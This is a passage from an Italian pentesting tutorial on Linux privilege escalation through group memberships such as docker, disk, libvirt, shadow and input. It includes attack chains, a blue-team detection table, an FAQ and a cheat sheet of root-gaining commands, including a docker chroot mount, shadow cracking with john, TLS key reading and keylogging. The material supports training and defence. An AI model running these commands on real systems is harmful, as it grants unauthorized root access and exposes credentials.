  → credenziali in un file di config → SSH come utente_A
  → id → gruppo "adm"
  → grep sui log → un comando mal scritto ha loggato una password per errore
  → sudo -l con quella password → root
```

**Scenario 3 — shadow → docker**

```
Shell come utente_A
  → id → gruppo "shadow", hash non locked
  → unshadow + john → hash di utente_B si rompe
  → SSH come utente_B
  → id → gruppo "docker", daemon locale confermato rootful
  → docker run -v /:/mnt --rm -it alpine chroot /mnt sh → root
```

**Scenario 4 — libvirt**

```
Shell come utente_A
  → id → gruppo "libvirt"
  → virsh -c qemu:///system list --all risponde → daemon root raggiungibile
  → findmnt / → /dev/sda1 reale
  → LIBGUESTFS_BACKEND=libvirt virt-rescue -a /dev/sda1 → mount → root.txt
```

## Matrice di impatto

| Gruppo                | Root diretto (condizionato)          | Espone credenziali          | Richiede un secondo step |
| --------------------- | ------------------------------------ | --------------------------- | ------------------------ |
| `disk`                | ✅ se device confermato               | ✅ (via shadow)              | ❌                        |
| `docker`              | ✅ se daemon rootful locale           | ❌                           | ❌                        |
| `lxd` / `incus-admin` | ✅ se daemon raggiungibile            | ❌                           | ❌                        |
| `libvirt`             | ✅ se `qemu:///system` + device reale | ❌                           | ✅ (identificare device)  |
| `shadow`              | ❌                                    | ✅ se non locked             | ✅ (cracking)             |
| `video`               | ❌                                    | ✅ se qualcosa è a video     | ✅ (secondo login)        |
| `adm`                 | ❌                                    | ✅ solo se misconfigurazione | ✅ (secondo login)        |
| `input`               | ❌                                    | ✅ se ACL lo permette        | ✅ (secondo login)        |
| `ssl-cert`            | ❌                                    | ❌ (chiavi, non password)    | ✅ (uso della chiave)     |

## Detection lato blue team

| Gruppo      | Cosa monitorare                                                                                                                                    | Nota                                                                                                                  |
| ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `disk`      | Apertura raw di block/character device da utenti non amministrativi                                                                                | Nessun utente applicativo dovrebbe farne parte                                                                        |
| `docker`    | Eventi di container con mount `/` host, `--privileged`, host PID/network namespace                                                                 | Mitigazione sul socket (rootless, ACL, authorization plugin, accesso time-bound) — non basta l'isolamento del runtime |
| `lxd`/Incus | Istanze con `security.privileged=true`, disk device `source=/`, modifiche a progetti/gruppi                                                        | Su Incus, limitare `incus-admin` a chi gestisce davvero l'host                                                        |
| `libvirt`   | Domain XML (il file di configurazione, in formato XML, che descrive una VM per libvirt) con block device host mappati, operazioni su socket manage | Restringere `unix_sock_group`/permessi in `libvirtd.conf`, preferire `qemu:///session` dove basta                     |
| `shadow`    | Letture di `/etc/shadow` fuori dai processi PAM attesi                                                                                             | —                                                                                                                     |
| `video`     | Accessi a `/dev/fb0` da processi diversi dal server grafico                                                                                        | Raro, correlare con sessioni attive                                                                                   |
| `adm`       | Credenziali in chiaro nei log applicativi                                                                                                          | È igiene applicativa, non solo controllo accessi                                                                      |
| `input`     | Apertura di `/dev/input/event*` da processi non di sessione                                                                                        | Preferire ACL dinamiche logind a membership statica                                                                   |
| `ssl-cert`  | Membri oltre ai servizi che ne hanno reale bisogno                                                                                                 | Ogni membro extra è una copia in più della chiave                                                                     |
| `lpadmin`   | Versione CUPS installata                                                                                                                           | Verificare che CVE-2012-5519 sia chiuso                                                                               |

## Domande frequenti

**Qual è il gruppo Linux più pericoloso per la privilege escalation?**
`disk`, `docker`, `lxd`/`incus-admin` e `libvirt` sono i più critici — ma solo quando il daemon/device corrispondente è confermato raggiungibile, non per il solo nome del gruppo.

**Come controllo a quali gruppi appartiene il mio utente?**
`id` per UID/GID e gruppi secondari, `getent group NOME` per includere anche fonti esterne come LDAP/SSSD.

**docker, lxd e libvirt sono ugualmente pericolosi?**
Il meccanismo di fondo è simile (un demone root esegue operazioni per conto tuo), ma le condizioni cambiano: docker/lxd spesso bastano da soli, libvirt richiede in più identificare il device host reale.

**Qual è la differenza tra i gruppi incus e incus-admin?**
`incus-admin` ha accesso completo e root-equivalent al demone. Il solo `incus` confina l'utente in un progetto isolato, senza privilegi amministrativi.

**Una password digitata in un terminale finisce nello screenshot del framebuffer?**
No — l'eco è disattivato per quell'input. Quello che può finire visibile è output già renderizzato (un comando con credenziale in chiaro, un file aperto), non la digitazione mascherata.

**Il gruppo ssl-cert permette di decifrare traffico TLS catturato?**
Solo su handshake legacy a scambio di chiave RSA statico. Con forward secrecy (ECDHE, TLS 1.3) la chiave privata del server non basta.

**Esiste un modo per enumerare automaticamente i gruppi pericolosi?**
[LinPEAS](https://hackita.it/articoli/linpeas/) e [LinEnum](https://hackita.it/articoli/linenum/) segnalano i finding — vanno comunque validati manualmente prima di agire.

## Cheat sheet finale: tutti i gruppi in un colpo d'occhio

| Gruppo                                                                           | Azione rapida                                                  | Cosa ottieni                                      |
| -------------------------------------------------------------------------------- | -------------------------------------------------------------- | ------------------------------------------------- |
| `sudo`/`wheel`                                                                   | `sudo -l`                                                      | Dipende dai binari permessi (vedi GTFOBins)       |
| `docker`                                                                         | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`          | Root diretto, se daemon rootful locale            |
| `disk`                                                                           | `findmnt /` → `debugfs /dev/sdX`                               | Lettura/scrittura raw, root-equivalent            |
| `lxd`/`incus-admin`                                                              | `lxc init ... -c security.privileged=true` + mount host        | Root diretto                                      |
| `libvirt`                                                                        | `LIBGUESTFS_BACKEND=libvirt virt-rescue -a /dev/sdX`           | Root, via device host reale                       |
| `kvm`                                                                            | — (da solo non porta a nulla)                                  | Nulla, serve `libvirt`                            |
| `shadow`                                                                         | `unshadow` + `john`                                            | Password in chiaro, se l'hash si rompe            |
| `video`                                                                          | `cat /dev/fb0` + conversione immagine                          | Screenshot dello schermo in quel momento          |
| `adm`                                                                            | `grep -i password /var/log/*`                                  | Credenziali, solo se altri hanno sbagliato        |
| `input`                                                                          | `evtest` / `cat /dev/input/eventX`                             | Keylogging, se l'ACL lo permette                  |
| `ssl-cert`                                                                       | `cat /etc/ssl/private/*.key`                                   | Chiave TLS, per impersonare/MITM                  |
| `root` (secondario)                                                              | `find / -group root -perm -g=w`                                | File di root scrivibili, dipende cosa trovi       |
| `staff`                                                                          | Hijack di `run-parts` in `/usr/local/bin`                      | Root al prossimo cron/SSH                         |
| `libvirt-qemu`/`qemu`                                                            | Leggi `/var/lib/libvirt/images/`                               | Immagini disco e segreti delle VM                 |
| `systemd-journal`                                                                | `journalctl -xe`                                               | Token/variabili d'ambiente nei log servizi        |
| `containerd`                                                                     | `ctr run --mount type=bind,src=/,dst=/...`                     | Root, come Docker                                 |
| `podman`                                                                         | `podman info` (controlla rootless)                             | Root solo se rootful                              |
| `systemd-network`                                                                | Leggi `/etc/systemd/network/*.network`                         | Chiavi WireGuard, se leggibili                    |
| `wireshark`/`pcap`                                                               | `getcap $(which dumpcap)` poi sniffing                         | Traffico di rete, solo con la capability          |
| `lp`                                                                             | Leggi lo spool di stampa                                       | Contenuto documenti stampati                      |
| `lpadmin`                                                                        | CVE-2012-5519 (solo CUPS datato)                               | File letti da `cupsd` come root                   |
| `operator`                                                                       | Enumera dati esposti a runtime dalla piattaforma               | Situazionale, spesso solo disclosure              |
| `dialout`                                                                        | Console seriale su `/dev/ttyUSB*`                              | Accesso a dispositivi embedded/router             |
| `netdev`                                                                         | `nmcli connection show NOME -p`                                | Password WiFi/VPN salvate in chiaro               |
| `www-data`                                                                       | `find / -group www-data -writable`                             | Modifica cosa esegue il webserver                 |
| `messagebus`                                                                     | Enumera `/run/dbus/`                                           | Superficie D-Bus, niche                           |
| `polkitd`                                                                        | Leggi regole polkit locali                                     | Situazionale                                      |
| `utmp`                                                                           | `w` / `who`, occhio a scritture su `wtmp`                      | Chi è connesso; anti-forensics se scrivibile      |
| `audio`                                                                          | Leggi `/dev/snd/*`                                             | Registrazione microfono, raro                     |
| `render`/`plugdev`                                                               | Enumera device GPU/rimovibili                                  | Raramente privesc diretto                         |
| `fuse`                                                                           | Verifica `user_allow_other`                                    | Mount accessibili ad altri utenti                 |
| `backup`                                                                         | `find / -group backup`                                         | Archivi con dati sensibili, se esposti            |
| `tape`/`sg`                                                                      | Device fisici (`/dev/st0`, `/dev/sg*`)                         | Quasi sempre irrilevante su cloud/VM              |
| `tty`                                                                            | Scrittura su terminali altrui                                  | Interferenza locale, non root                     |
| `kmem`/`mem`                                                                     | — (quasi morto sui kernel moderni)                             | Storico, raramente sfruttabile oggi               |
| `microk8s`/`kube*`                                                               | `microk8s kubectl` (se il gruppo esiste)                       | Dipende da RBAC/Pod Security del cluster          |
| `users`, `nogroup`, `games`, `cdrom`, `floppy`, `scanner`, `fax`, `voice`, `dip` | `find / -group NOME` (solo se compare qualcosa di inaspettato) | Quasi mai niente — basso segnale di default       |
| `mail`                                                                           | Controlla code di posta locali                                 | OTP/link di reset, se qualcosa transita ancora lì |

## Key takeaways

* Un gruppo è un segnale da verificare, non una prova di privilegio: conta l'oggetto reale (socket, device, file) e chi lo consuma.
* `disk`, `docker`, `lxd`/`incus-admin` e `libvirt` possono dare root-equivalent, ma condizionato a demone/device confermati.
* `shadow`, `video`, `adm`, `input` e `ssl-cert` espongono dati per un secondo passo, non root diretto.
* Correggi le assunzioni facili: password non compaiono negli screenshot di un prompt mascherato; una chiave TLS non decifra traffico con forward secrecy; `/dev/fb0` assente non è prova di headless.
* Verifica sempre `id`/`getent group` dopo ogni cambio utente in una chain.
* Lato difesa: nessun utente applicativo dovrebbe mai trovarsi in `disk`, `shadow`, `docker`, `lxd`/`incus-admin` o `libvirt` senza un motivo operativo verificato.

## Articoli correlati

| Articolo                                                                 | Perché leggerlo                                                           |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------- |
| [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc/) | Panoramica generale, punto di partenza per l'intero argomento             |
| [GTFOBins](https://hackita.it/articoli/gtfobins/)                        | Database di binari abusabili, utile per la voce sudo/wheel                |
| [LinPEAS](https://hackita.it/articoli/linpeas/)                          | Tool di enumerazione automatica, i finding vanno comunque validati a mano |
| [LinEnum](https://hackita.it/articoli/linenum/)                          | Script di enumerazione alternativo                                        |
| [Container Escape](https://hackita.it/articoli/container-escape/)        | Tecniche di escape più avanzate, oltre il triage del gruppo               |
| [Unix Privesc Check](https://hackita.it/articoli/unix-privesc-check/)    | Altro script di enumerazione automatica, alternativo a LinPEAS            |
| [John the Ripper](https://hackita.it/articoli/john-the-ripper/)          | Il tool usato per craccare gli hash di `/etc/shadow`                      |
| [Kernel Exploits](https://hackita.it/articoli/kernel/)                   | Il piano B quando nessun gruppo dà accesso utile                          |

***

*Contenuto a scopo didattico. Le tecniche descritte vanno testate esclusivamente su ambienti autorizzati: lab personali, piattaforme come HackTheBox o VulnLab, CTF.*
